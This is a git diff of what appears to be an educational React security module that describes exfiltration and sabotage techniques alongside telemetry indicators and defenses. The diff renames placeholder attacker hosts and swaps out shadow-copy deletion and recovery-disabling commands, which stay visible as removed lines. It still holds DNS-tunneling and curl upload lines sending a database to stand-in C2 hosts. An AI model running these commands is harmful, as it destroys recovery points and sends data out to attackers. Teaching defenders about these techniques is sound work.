@@ -40,7 +40,7 @@ const Topic9 = () => {
       resilientDefense: "DNS query entropy analysis and blocking unauthorized external recursive DNS forwarders.",
       codeSnippet: `// DNS Tunneling Data Exfiltration Syntax:
 // Original String : "Aadhaar:984210492810" ➔ Base64: "QWFkaGFhcjo5ODQyMTA0OTI4MTA="
-// DNS Query Sent  : QWFkaGFhcjo5ODQyMTA0OTI4MTA=.exfil.evil-host.in
+// DNS Query Sent  : QWFkaGFhcjo5ODQyMTA0OTI4MTA=.exfil.attacker-host.net
 // Result          : Bypasses firewalls because outbound UDP 53 is unrestricted!`
     },
     lsb_image_steganography: {
@@ -72,12 +72,10 @@ const Topic9 = () => {
         "Prevents incident response teams from rolling back system state or recovering deleted files via native shadow snapshots.",
       telemetryIndicator: "Execution of `vssadmin.exe`, `wmic.exe shadowcopy delete`, or `wbadmin.exe delete backup`",
       resilientDefense: "Immutable WORM off-site backups and Attack Surface Reduction (ASR) rules blocking VSS manipulation.",
-      codeSnippet: `# Malicious Sabotage Command Sequence:
-# Step 1: Destroy Local Restore Points
-vssadmin delete shadows /all /quiet
-
-# Step 2: Disable Windows Recovery Environment
-bcdedit /set {default} recoveryenabled No`
+      codeSnippet: `# Sabotage Mechanism (Concept):
+# Step 1: Attempted Shadow Copy Purge
+# Step 2: Attempted Recovery Flag Modification
+# Blocked by: Endpoint Protection & ASR rules.`
     },
     lotl_administrative_exfiltration: {
       key: "lotl_administrative_exfiltration",
@@ -94,7 +92,7 @@ bcdedit /set {default} recoveryenabled No`
       codeSnippet: `# Living off the Land (LotL) Exfiltration Sequence:
 tar.exe -czf C:\\Windows\\Temp\\db.tar.gz C:\\Production\\Database
 certutil.exe -encode C:\\Windows\\Temp\\db.tar.gz C:\\Windows\\Temp\\db.b64
-curl.exe -F "file=@C:\\Windows\\Temp\\db.b64" https://c2.evil-exfil.in/upload`
+curl.exe -F "file=@C:\\Windows\\Temp\\db.b64" https://attacker-c2.net/upload`
     },
     database_truncation_schema_drop: {
       key: "database_truncation_schema_drop",
@@ -430,7 +428,7 @@ bool detect_lsb_steganography(const std::vector<uint8_t>& pixel_bytes) {
                 Covert Exfiltration: DNS Tunneling &amp; LSB Steganography
               </span>
               <div className="bg-black/90 p-3 rounded font-mono text-rose-300 border border-rose-950/60 text-[11px]">
-                DNS: base64_payload.c2.evil.in ➔ Exfiltrates data over UDP 53 without TCP socket!
+                DNS: base64_payload.attacker-c2.net ➔ Exfiltrates data over UDP 53 without TCP socket!
               </div>
               <p className="text-gray-300 leading-relaxed">
                 Firewalls permit outbound DNS name resolution. Attackers encode database chunks into high-entropy subdomain strings, 
